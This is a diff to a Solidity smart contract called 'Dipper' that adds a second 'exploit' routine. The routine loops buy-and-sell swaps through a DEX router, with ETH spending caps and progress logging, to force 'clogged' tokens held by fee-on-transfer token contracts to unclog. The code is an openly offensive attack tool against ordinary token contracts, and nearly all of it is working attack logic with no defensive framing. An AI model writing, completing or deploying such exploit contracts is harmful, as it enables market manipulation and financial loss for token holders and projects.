@@ -49,33 +49,43 @@ contract Dipper {
     }
 
     function exploit(
-        uint8 m1_m6_max_sell_swaps,
+        uint8 maxRounds,
         uint256 minEthLiquidity,
-        uint256 tokensMaxBag,
-        address[] calldata path
+        uint256 swapThresholdTokens,
         // address pair
-    ) public payable onlyOwner {
+        address[] calldata path
+    )
+        public
+        payable
+        onlyOwner
+    {
         // require(!locks[path[path.length - 1]], "Locked");
 
         // validatePair(path[path.length - 2], pair, minEthLiquidity);
 
-        uint8 mode = getDipperMode(path, tokensMaxBag);
+        uint8 mode = getDipperMode(path, swapThresholdTokens);
         require(mode != 0, "Could not identify");
 
         if (mode == 1) {
-            _exploit_m1_m6(path, 0, m1_m6_max_sell_swaps);
-            return;
+            _exploit_m1_m6(path, 0, maxRounds);
         }
 
         if (mode == 2) {
-            // exploit_m2_m3_m4_m5();
-            return;
+            _exploit_m2_m3_m4_m5(
+                path,
+                0,
+                swapThresholdTokens,
+                msg.value,
+                maxRounds
+            );
         }
+
+
     }
 
     function getDipperMode(
         address[] calldata path,
-        uint256 tokensMaxBag
+        uint256 swapThreshold
     ) public payable onlyOwner returns (uint8 mode) {
         // m1, m6 - tryDipping(0.001, <not required / not used / zero>, 1)
         console.log("M1 / M6 Tests");
@@ -85,7 +95,7 @@ contract Dipper {
 
         // m2, m3, m5 - tryDipping(<a reasonable amount for buying a maxbag per round>, maxBag, 1)
         console.log("M2, M3, M5 Tests");
-        if (_simulateDipping(path, msg.value, tokensMaxBag, 1) == 1) {
+        if (_simulateDipping(path, msg.value, swapThreshold, 1) == 1) {
             return 2;
         }
     }
@@ -125,7 +135,7 @@ contract Dipper {
         console.log("initialClogged: ", initialClogged);
 
         // approve
-        IERC20(path[1]).approve(address(extRouter), type(uint256).max);
+        token.approve(address(extRouter), type(uint256).max);
 
         for (uint8 i = 0; i < rounds; i++) {
             // swap buy
@@ -177,7 +187,7 @@ contract Dipper {
     ) internal {
         IERC20 token = IERC20(path[path.length - 1]);
 
-        IERC20(path[1]).approve(address(extRouter), type(uint256).max);
+        token.approve(address(extRouter), type(uint256).max);
 
         uint256 initialClogged = getCloggedPercentage(token);
         console.log("initialClogged: ", initialClogged);
@@ -190,7 +200,8 @@ contract Dipper {
             revert(string(abi.encodePacked("!xpl1_6 buy swap: ", reason)));
         }
 
-        uint256 tokensPerSellRound = token.balanceOf(address(this)) / max_sell_swaps;
+        uint256 tokensPerSellRound = token.balanceOf(address(this)) /
+            max_sell_swaps;
         address[] memory sellPath = _invertPath(path);
 
         for (uint8 i = 0; i < max_sell_swaps; i++) {
@@ -233,14 +244,108 @@ contract Dipper {
                     roundUncloggedPercentage,
                     ". Which means the unclogging is not being effective anymore. We're done."
                 );
-                revert("xpl1_6: We're not being effective, and I don't like that.");
+                revert(
+                    "xpl1_6: We're not being effective, and I don't like that."
+                );
             }
         }
 
         revert("xpl1_6: Sorry, we could not, but at least we tried.");
     }
 
-    function _exploit_m2_m3_m4_m5() internal {}
+    function _exploit_m2_m3_m4_m5(
+        address[] calldata path,
+        uint256 target_clogged_percentage,
+        uint256 minSwapThreshold,
+        uint256 maxEthSpent,
+        uint8 max_rounds
+    ) internal {
+        require(
+            address(this).balance >= maxEthSpent,
+            "maxEthSpent is lower than contract's balance."
+        );
+
+        IERC20 token = IERC20(path[path.length - 1]);
+        token.approve(address(extRouter), type(uint256).max);
+
+        address[] memory sellPath = _invertPath(path);
+        uint256 initialEthBalance = address(this).balance;
+
+        for (uint8 i = 0; i < max_rounds; i++) {
+            uint256 ethSpent = initialEthBalance - address(this).balance;
+            console.log("Spent ", ethSpent, " ETH so far - round:", i);
+
+            require(
+                ethSpent < maxEthSpent,
+                string(
+                    abi.encodePacked(
+                        "Total Eth consumption is above our threshold. at ",
+                        i
+                    )
+                )
+            );
+
+            uint256 cloggedPercentageBefore = getCloggedPercentage(token);
+
+            try
+                extRouter.swapETHForExactTokens{value: address(this).balance}(
+                    minSwapThreshold,
+                    path,
+                    address(this),
+                    block.timestamp + 120
+                )
+            {} catch Error(string memory reason) {
+                revert(
+                    string(abi.encodePacked("xpl_2_3_4_5: Buy error: ", reason))
+                );
+            }
+
+            try
+                extRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
+                    token.balanceOf(address(this)),
+                    0,
+                    sellPath,
+                    address(this),
+                    block.timestamp + 120
+                )
+            {} catch Error(string memory reason) {
+                revert(
+                    string(abi.encodePacked("xpl2_3_4_5: Sell error: ", reason))
+                );
+            }
+
+            uint256 cloggedPercentageAfter = getCloggedPercentage(token);
+            uint256 roundUncloggedPercentage = cloggedPercentageBefore >=
+                cloggedPercentageAfter
+                ? cloggedPercentageBefore - cloggedPercentageAfter
+                : 0;
+
+            console.log("Unclog Round", i);
+            console.log("Before Clogged:", cloggedPercentageBefore);
+            console.log("After Clogged:", cloggedPercentageAfter);
+            console.log("Round Unclogged:", roundUncloggedPercentage);
+
+            if (cloggedPercentageAfter <= target_clogged_percentage) {
+                console.log(
+                    "Clogged Percentage is lower than the target clogged percentage. We're done."
+                );
+                return;
+            }
+
+            if (roundUncloggedPercentage == 0) {
+                console.log(
+                    "Round Unclogged Percentage was",
+                    roundUncloggedPercentage,
+                    ". Which means the unclogging is not being effective anymore. We're done."
+                );
+                revert(
+                    "xpl2_3_4_5: We're not being effective, and I don't like that."
+                );
+            }
+        }
+
+        revert("xpl2_3_4_5: Sorry, we could not, but at least we tried.");
+    }
 
     ////////     UTILS     ////////
 
